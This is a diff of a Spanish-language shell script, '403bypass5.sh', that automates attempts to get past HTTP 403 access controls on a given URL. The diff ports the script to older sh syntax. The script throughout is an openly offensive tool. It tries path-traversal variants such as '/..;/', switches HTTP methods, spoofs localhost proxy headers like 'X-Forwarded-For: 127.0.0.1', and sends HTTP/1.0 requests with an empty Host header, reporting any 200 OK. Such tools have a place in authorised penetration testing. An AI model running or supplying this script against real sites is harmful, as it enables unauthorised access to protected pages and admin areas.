@@ -1,11 +1,8 @@
-#!/bin/bash
+#!/bin/sh
 # 403bypass5.sh
-# Muestra SOLO casos 200 OK + imprime la petición curl completa con -v
-# Permite pasar la URL completa de una vez
-#
-# Uso:
-#   ./403bypass5.sh https://target.com/ruta/protegida/
-#   ./403bypass5.sh https://ejemplo.com/admin
+# Adaptado para Bash ~1.0.x (compatible con shells antiguos)
+# 
+# Solo muestra 200 OK + petición curl completa (-v)
 
 if [ $# -ne 1 ]; then
     echo "Uso: $0 <URL_COMPLETA>"
@@ -17,8 +14,10 @@ fi
 
 FULL_TARGET="$1"
 
-# Quitamos posible / final para normalizar
-FULL_TARGET="${FULL_TARGET%/}"
+# Quitamos posible / final (truco simple compatible)
+case "$FULL_TARGET" in
+    */) FULL_TARGET=`echo "$FULL_TARGET" | sed 's/\/$//'` ;;
+esac
 
 echo ""
 echo "============================================================="
@@ -27,9 +26,7 @@ echo " (solo se muestran respuestas 200 OK)"
 echo "============================================================="
 echo ""
 
-# ────────────────────────────────────────────────
-#  Payloads de path (relativos al final de la URL base)
-# ────────────────────────────────────────────────
+# Payloads de path (usamos cat <<'EOF' para máxima compatibilidad)
 payloads() {
     cat << 'EOF'
 /
@@ -52,17 +49,12 @@ payloads() {
 EOF
 }
 
-# Extraemos el "último directorio" para algunos payloads relativos
-LAST_DIR=$(basename "$FULL_TARGET")
+# Último directorio (basename compatible)
+LAST_DIR=`basename "$FULL_TARGET"`
 
-# ────────────────────────────────────────────────
-#  Métodos a probar
-# ────────────────────────────────────────────────
+# Métodos
 METHODS="GET HEAD OPTIONS POST"
 
-# ────────────────────────────────────────────────
-#  Cabeceras especiales
-# ────────────────────────────────────────────────
 special_headers() {
     cat << 'EOF'
 X-Forwarded-For: 127.0.0.1
@@ -77,23 +69,18 @@ Forwarded: for=127.0.0.1;proto=https;by=localhost
 EOF
 }
 
-# ────────────────────────────────────────────────
-#  Función auxiliar: ejecuta curl y muestra solo si es 200
-# ────────────────────────────────────────────────
+# Función auxiliar (sin local)
 run_curl() {
-    local cmd="$1"
+    cmd="$1"
     echo "$cmd"
     echo "--------------------------------------------------"
-    
-    # Ejecutamos con -v para ver el request completo
-    # -s para no mostrar barra de progreso
-    # -m 8 timeout
-    # -w para capturar el código de estado
-    output=$(eval "$cmd -s -k -m 8 -v -o /dev/null -w '%{http_code}'" 2>&1)
-    
-    http_code=$(echo "$output" | tail -n1)
-    
-    if [[ "$http_code" == "200" ]]; then
+
+    # Ejecutamos curl -v -s -k -m 8 -o /dev/null -w '%{http_code}'
+    output=`eval "$cmd -s -k -m 8 -v -o /dev/null -w '%{http_code}'" 2>&1`
+
+    http_code=`echo "$output" | tail -n1`
+
+    if [ "$http_code" = "200" ]; then
         echo "$output" | grep -v "^{" | grep -v "^}" | grep -v "^* "
         echo ""
         echo ">>> ÉXITO 200 OK DETECTADO <<<"
@@ -103,14 +90,14 @@ run_curl() {
 }
 
 # ────────────────────────────────────────────────
-#  1. Variaciones de path + distintos métodos
+# 1. Variaciones de PATH + métodos
 # ────────────────────────────────────────────────
 echo "[*] 1. Variaciones de PATH + cambio de método"
 echo "-------------------------------------------------------------"
 
-for payload in $(payloads); do
+for payload in `payloads`; do
     test_url="${FULL_TARGET}${payload}"
-    
+
     for method in $METHODS; do
         cmd="curl -X $method -I \"$test_url\""
         run_curl "$cmd"
@@ -118,13 +105,13 @@ for payload in $(payloads); do
 done
 
 # ────────────────────────────────────────────────
-#  2. Cabeceras de spoofing (solo GET por ahora)
+# 2. Cabeceras de spoofing (solo GET)
 # ────────────────────────────────────────────────
 echo ""
 echo "[*] 2. Cabeceras de proxy / localhost spoofing (GET)"
 echo "-------------------------------------------------------------"
 
-for header in $(special_headers); do
+for header in `special_headers`; do
     for extra in "" "/" "//" "/." "/..;/" "/.;/" "/ "; do
         test_url="${FULL_TARGET}${extra}"
         cmd="curl -X GET -I -H \"$header\" \"$test_url\""
@@ -133,7 +120,7 @@ for header in $(special_headers); do
 done
 
 # ────────────────────────────────────────────────
-#  3. Trucos clásicos HTTP/1.0 + Host vacío
+# 3. Trucos HTTP/1.0 + Host vacío
 # ────────────────────────────────────────────────
 echo ""
 echo "[*] 3. Trucos HTTP/1.0 + Host header vacío"
@@ -149,8 +136,8 @@ run_curl "$cmd"
 cmd="curl --http1.0 -I \"$test_url\""
 run_curl "$cmd"
 
-# HTTP/1.0 + Host vacío
+# HTTP/1.0 + Host: vacío
 cmd="curl --http1.0 -I -H \"Host:\" \"$test_url\""
 run_curl "$cmd"
 
-echo 
+echo ""
